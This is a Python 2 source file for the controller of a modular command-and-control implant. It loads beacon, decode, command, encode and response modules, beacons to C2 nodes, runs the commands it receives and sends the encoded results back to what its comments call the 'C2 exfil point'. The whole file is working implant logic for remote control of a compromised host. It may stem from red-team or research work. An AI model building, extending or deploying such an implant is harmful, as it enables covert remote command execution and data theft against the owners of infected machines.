
#
# This is the application controller that manages the calls through all the different types of modules
#
import config
import inspect
import sys
import warnings
from implant_modules.command_object import CommandObject
from implant_modules.order import Order

# TODO:
# - Add a transform method which allows the settings XML document to define the 'key' for commands and their KVP parameters. This will need to be a transform of the command handler that occurs AFTER the imports.
# - Considering wrapping each node into a Node class upon initial import.
# - Fix easy_import and abstract_builder so you can hand it a list of the modules for a package (beacons, commands, etc), since the import can receive a list. More efficient.
# - Consider change command modules from {cmd:params} to (cmd, params) tuple. Better utilizes types to separate data. 
# - more flexible designation of where to send the results/responses
# - Add behaviors as modules
# - make the sending of results/responses optional
# - make the results sending have an option of be dependant upon the command (i.e each command results can be sent somewhere different, or not at all, etc)

class Controller:
    
    beacon_map = {}
    decoder_list = {} # list
    command_map = {}
    encoder_list = {} # list
    response_map = {}
    
    def __init__(self, beacons, commands, decoders, encoders, responders):
        
        self.build_handlers(beacons, commands, decoders, encoders, responders)
    
    # ###############
    # UTILITIES
    # ###############
    
    def get_module_class(self, module):
        """
        gets the class object of the module .py file
        """
        try:
            for name, obj in inspect.getmembers(module):
                # must check for parent module name (should be beacon/codec/etc) as to avoid imported class objects
                if inspect.isclass(obj) and obj.__module__ == module.__name__:
                    return obj
                    # have it instantiate the object? depends where I decide to use this method: obj_() creates an instance.
        except Exception, e:
            print "Error getting class from %s module" % (module.__name__)
            raise

    def easy_import(self, pkg_name, module_name):
        """
        Dynamically imports a class from a given module
        """
        try:
            pkg = __import__(pkg_name, fromlist=[module_name])
        except ImportError ,e:
            print "Erorr importing %s from %s" % (module_name, pkg_name)
            raise
        module = getattr(pkg,module_name)
        return self.get_module_class(module)
    
    def abstract_builder(self, pkg_name, name_list, return_list = False):
        """
        This function will build lists or dictionaries of modules to be used by the controller's handlers
        """
        # some handlers needs dicts (commands, beacons), while some need lists (encoders,decoders, etc)
        if return_list:
            ret_val = []
        else:
            ret_val = {}
        
        # Go through the string names and get the appropriate Class from the appropriate module.
        # Once you have that, do a dynamic import so we can use it, then map that class type
        # so we can instantiate the appropriate instance when going through a beaconing interation.
        for module_name in name_list:

            module_class = self.easy_import(pkg_name, module_name) # imports the class
            if return_list:
                ret_val.append(module_class) # adds the Class object to a list
            else:
                ret_val[module_name] = module_class # maps the Class object to the appropriate module name
            
        return ret_val
    
    # ###############    
    # HANDLER BUILDERS
    # ###############
    
    # Note:
    # I added these facades because I am unsure how this architecture will work in the long run.
    # Hence, I am using a ludicrous number of functions and facades.
    
    def build_beacon_handler(self, beacons):
        self.beacon_map = self.abstract_builder(config.BEACON_PKG, beacons)

    def build_command_handler(self, commands):
        self.command_map = self.abstract_builder(config.COMMAND_PKG, commands)
    
    def build_decoder_handler(self, decoders):
        self.decoder_list = self.abstract_builder(config.DECODER_PKG, decoders, True) #return a list
        
    def build_encoder_handler(self, encoders):
        self.encoder_list = self.abstract_builder(config.ENCODER_PKG, encoders, True) #return a list
        
    def build_responder_handler(self, responders):
        self.response_map = self.abstract_builder(config.RESPONDER_PKG, responders)
    
    def build_handlers(self, beacons, commands, decoders, encoders, responders):
        # this function is used by the constructor to setup the dictionaries with the command to command object mapping.
        self.build_beacon_handler(beacons)
        self.build_command_handler(commands)
        self.build_decoder_handler(decoders)
        self.build_encoder_handler(encoders)
        self.build_responder_handler(responders)
    
    # ###############
    # HANDLER CALLERS
    # ###############
    
    def handle_beacon(self, nodes):
        """
        This function will go through the nodes, instantiating the appropriate module object and attempt
        to beacon out in succession to the supplied Nodes. It will fail our it no nodes are available.
        """
        # 
        # nodes example:
        # list of tuples, where each tuples first value is a string of the beacon type and second value is a dictionary of arguments
        # [('http_get',{'node':'192.168.2.2','port':'80','path':'/index.html','timeout':'10'})]
        #
        
        print config.BEAC_PROMPT + " beaconing..."
        
        try:
            
            success = False
            # Should I randomize the order of nodes? this is a potential behavior that could be defined.
            for node in nodes:
                beacon_type = node[config.BEACON_TYPE_IND]
                params = node[config.PARAMS_IND]
                
                ip = params.get(config.NODE_IP_KEY)
                port = params.get(config.NODE_PORT_KEY)
        
                beaconer_class = self.beacon_map.get(beacon_type) # get this from the beacon map based on beacon type
                beaconer = beaconer_class() # instantiate the object
                try:
                    success, response = beaconer.beacon(params)
                except Exception, e:
                    print "%s Error connecting to %s:%s" % (config.BEAC_PROMPT, ip, port)
                    success = False
                
                # generate a 'bean' called Orders to act as a sort of 'cookie' between handlers
                if success:
                    print "%s Successfully retrieved data from %s:%s" % (config.BEAC_PROMPT, ip, port)
                    order = Order()
                    order.node = node
                    order.node_ip = ip
                    order.node_port = port
                    order.node_type = beacon_type
                    order.node_params = params
                    order.raw_response = response
                    
                    return (success, order)
                else:
                    # Will not all failures raise an exception? Perahsp this should be forced implementation by all Beaconers?
                    # print "%s Failed to retrieve data from %s:%s" % (BEAC_PROMPT, ip, port)
                    # Should I pause here or just continue?
                    pass
                
            # What do I do if none of the nodes worked?
            return (False, None)
        except TypeError as e:
            print "No such class for provided beacon type: %s" % (beacon_type)
            raise e
        except Exception,e :
            raise e
    
    def recursive_decoder(self, decoder, encoded_data, full_body = False):
        """
        this method is currently used by both the decoder and encoder handlers. I will not change
        the names of the variables or the method to be more agnostic until I am sure that the encoders
        work successfully
        
        The 'full_body' flag indicates that the codec should be applied to the entire data set as a single entity.
        If left to be False, the default behavior is to apply the codec to each iterable object independently.
        """
        decoded_data = []
        
        success = True
        
        try:
            
            #If string or full_body flag is set, apply the codec to the entire body of data
            if isinstance(encoded_data,basestring) or full_body:
                decoded_data.append(decoder(encoded_data))

            # if its a dictionary, apply codec to the key and also the value. If the value is a container, call recursive decoder.
            elif type(encoded_data) is dict:
                
                    decoded_portion = {}
                    for encoded_key, encoded_value in encoded_data.items():
                        decoded_key = decoder(encoded_key)
                        
                        if type(encoded_value) is list or type(encoded_value) is dict:
                            success, data = self.recursive_decoder(decoder, encoded_value)
                            decoded_value = data
                        else:
                            decoded_value = decoder(encoded_value)
                        
                        decoded_portion[decoded_key] = decoded_value

                    decoded_data.append(decoded_portion)
            # If the contents is a list or tuple, recursively decode each element by sending itself to the function
            elif type(encoded_data) is list or type(encoded_data) is tuple:

                for encoded_portion in encoded_data:
                    
                    success, data = self.recursive_decoder(decoder, encoded_portion)
                    if success:
                        decoded_data.append(data)
                    else:
                        return (False, None)
                    
            else:
                print type(encoded_data), encoded_data
                print config.COD_PROMPT + 'Data was not formatted as dict, list/tuple, string!'
                raise
            
            ## NOTE: If nested multiple commands breaks, this is likely the culprit
            if len(decoded_data) == 1:
                decoded_data = decoded_data[0]
                
        except Exception, e:
                print e
                print config.COD_PROMPT + " Issue in codec while trying to code %s" % (encoded_data)
                return (False, None)
        
        return success, decoded_data
    
    def handle_decode(self, encoded_data):
        """
        This method takes the encoded order and runs it iteratively through each decoder.
        """
        
        config.COD_PROMPT = config.DEC_PROMPT
        print config.DEC_PROMPT + " decoding..."
        
        # while there is another decoder, run each item through the next decoder
        data = encoded_data
        success = False
        for decoder in self.decoder_list:
            current_decoder = decoder()
            success, data = self.recursive_decoder(current_decoder.decode, data)
            if not success:
                break
            print config.DEC_PROMPT + "%s decoded to '%s'" % ( current_decoder.name(),data)
        return success, data
    
    def recursive_execute(self, command):
        """
        this method will run each command from the C2 node. It will also keep track of scope for
        groups of commands that should be ran in batches or otherwise nested groups. Not really useful
        since we will have a hard time undoing any previous command, but it might be interesting to see
        what people come up with.
        """
        type_check = type(command)
        
        agg_results = []
        success = False

        try:

            if type_check is dict:
                cmd_obj = None
                args = None
                for cmd, params in command.items():
                    cmd_class = self.command_map.get(cmd)
                    cmd_obj = cmd_class()
                    args = params
                    print config.CMD_PROMPT + " Executing: %s" % (cmd_obj.name())
                    success, results = cmd_obj.execute(params)
    
                cmd_results = {}
                cmd_results[config.CMD_SUCC_KEY] = success
                cmd_results[config.CMD_RES_KEY] = results
                cmd_results[config.CMD_NAME_KEY] = cmd_obj.name()
                cmd_results[config.CMD_ARGS_KEY] = args 
                agg_results.append(cmd_results)

            elif type_check is list:
                print config.CMD_PROMPT + " Beginning Sub Command Chain"
                for cur_cmd in command:
                    success, results = self.recursive_execute(cur_cmd)
                    # not doing anything with success here
                    agg_results.append(results)
                print config.CMD_PROMPT + " Finishing Sub Command Chain"

                    
            else:
                print config.CMD_PROMPT + " Improper formatted command: %s" % (command)
            
        except Exception, e:
            raise
            
        return success, agg_results
    
    def handle_command(self, commands):
        """
         Iterates through each commands from the C2 Node's order and executes appropriately.
        """
        print config.CMD_PROMPT + " calling commands..."
        
        results = []
        success = False

        print config.CMD_PROMPT + " Beginning Command Chain"
        for command in commands:
            success, result = self.recursive_execute(command)
            # Is there going to be complex results checking and handling code?
            results.append(result)
            
        # check results for threads, if there are, add them to a pool to be tracked
        print config.CMD_PROMPT + " Command Chain Completed"
        return success, results

    
    def handle_encode(self, results):
        """
        Encodes the results of executed commands multiple times in preparation for sending back to the LP/C2 node.
        It is likely that most encoders should do a full_body_encode, to make sure iterable objects containing
        results are appropriately encoded before being sent.
        """
        
        config.COD_PROMPT = config.ENC_PROMPT
        print config.ENC_PROMPT + " encoding results..."
        
        # while there is another decoder, run each item through the next decoder
        data = results
        success = False
        for encoder in self.encoder_list:
            current_encoder = encoder()
            full_body = getattr(current_encoder,'full_body_encode',False)
            success, data = self.recursive_decoder(current_encoder.encode, data, full_body)
            if not success:
                break
            print config.ENC_PROMPT + "%s encoded to '%s'" % ( current_encoder.name(),data)
        return success, data
        
    
    def handle_response(self, order):
        """
        This handler will try to send the results back to the node that issued the commands in the first place.
        """
        print config.RESP_PROMPT + " sending results of order %s..." % (order.uuid)
        node = order.node
        responder_type = node[config.BEACON_TYPE_IND]
        params = node[config.PARAMS_IND]
                
        ip = params.get(config.NODE_IP_KEY)
        port = params.get(config.NODE_PORT_KEY)
        
        responder_class = self.response_map.get(responder_type) # get this from the beacon map based on beacon type
        responder = responder_class() # instantiate the object
        try:
            success = responder.send_response(params, order.response)
        except Exception, e:
            print "%s Error connecting to %s:%s (%s)" % (config.RESP_PROMPT, ip, port, e)
            success = False
            
        return success
        
    
    def handle(self, nodes):
        """
        This calls the appropriate handlers in succession. Beaconers->Decoders->Commands->Encoders->Responders
        """
        success = False
        
        try:
            # Attempt to beacon. Returns an Order object or None.
            success, order = self.handle_beacon(nodes)
            
            # Send response to decoders
            if success:
                success, decoded_data = self.handle_decode(order.raw_response)
            else:
                return False 
            
            # Process command
            if success:
                #TODO: Here we should turn tuples, strings, dicts and lists into CommandObjects. Then add these CommandObjects to the Order. 
                # then hand the Order to the command handler, from there it should
                order.commands = decoded_data
                success, results = self.handle_command(decoded_data)
                order.results = results
            else:
                return False
            
            # encode response here
            if success:
                success, encoded_results = self.handle_encode(results)
                order.response = encoded_results
            else:
                return False
            
            # Send response
            if success:
                success = self.handle_response(order)
            else:
                return False
        except Exception, e:
            # Here consider sending back a message to the C2 exfil point, letting them know why the implant died
            # if so, replace the return statements with raise statements and define appropriate exceptions with mesages
            print "%s Exception: %s" % ( config.BASIC_PROMPT, e)
            return False

        return True        
    
    def beacon(self, nodes):
        """
        This facade method is used to start the beaconing process
        """
        result = self.handle(nodes)
        print "%s Beaconing iteration %s" % (config.BASIC_PROMPT,("FAILED", "SUCCEEDED")[result])
        return result
    
    